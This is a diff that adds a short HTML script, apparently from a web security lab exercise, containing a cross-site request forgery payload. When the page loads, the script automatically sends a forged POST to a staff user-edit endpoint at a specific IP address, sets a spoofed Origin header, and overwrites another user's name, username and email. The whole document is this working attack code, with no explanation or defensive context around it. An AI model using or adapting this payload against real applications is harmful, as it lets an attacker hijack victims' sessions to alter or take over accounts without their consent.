@@ -1,0 +1,16 @@
+<script>
+function csrfJS() {
+    var xhttp = new XMLHttpRequest();
+    xhttp.onreadystatechange = function() {
+        if (this.readyState == 4 && this.status == 200) {
+            alert(this.responseText);
+        }
+    };
+    xhttp.open("POST", "https://35.225.211.56/red/public/staff/users/edit.php?id=2", true);
+    xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+    xhttp.setRequestHeader("Origin", "https://35.225.211.56");
+    xhttp.send("first_name=Bobby&last_name=Tables&username=lbtables&email=lbt2000%40nowhere.com&previous_password=&password=&confirm_password=&submit=Update");
+}
+
+csrfJS();
+</script>
